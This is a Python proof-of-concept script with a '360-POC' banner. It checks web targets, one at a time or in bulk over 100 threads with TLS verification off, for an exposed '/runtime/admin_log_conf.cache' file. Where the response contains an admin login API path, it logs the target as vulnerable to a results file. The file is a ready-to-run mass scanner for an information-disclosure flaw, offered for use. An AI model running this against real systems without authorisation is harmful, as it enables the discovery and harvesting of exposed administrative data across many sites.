import requests
import argparse
import sys,json,urllib3
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告
def banner():
    demo = '''██████╗  ██████╗  ██████╗       ██████╗  ██████╗  ██████╗
╚════██╗██╔════╝ ██╔═████╗      ██╔══██╗██╔═══██╗██╔════╝
 █████╔╝███████╗ ██║██╔██║█████╗██████╔╝██║   ██║██║     
 ╚═══██╗██╔═══██╗████╔╝██║╚════╝██╔═══╝ ██║   ██║██║     
██████╔╝╚██████╔╝╚██████╔╝      ██║     ╚██████╔╝╚██████╗
╚═════╝  ╚═════╝  ╚═════╝       ╚═╝      ╚═════╝  ╚═════╝
                                                                    @autor:Chengzi
'''
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    banner()
    parser = argparse.ArgumentParser(description='welcome to use!')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file,'r',encoding='utf-8')as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if '/api/node/login' in res.text:
            print(f"[+] {target} 存在漏洞")
            with open("result-360.txt", "a", encoding="utf-8") as ff:
                ff.write(f"[+] {target} 存在漏洞"+'\n')
        else:
            print(f"[-] {target} 不存在漏洞")
    except:
        print(f"[*] {target} 该站点存在问题")

if __name__ == '__main__':
    main()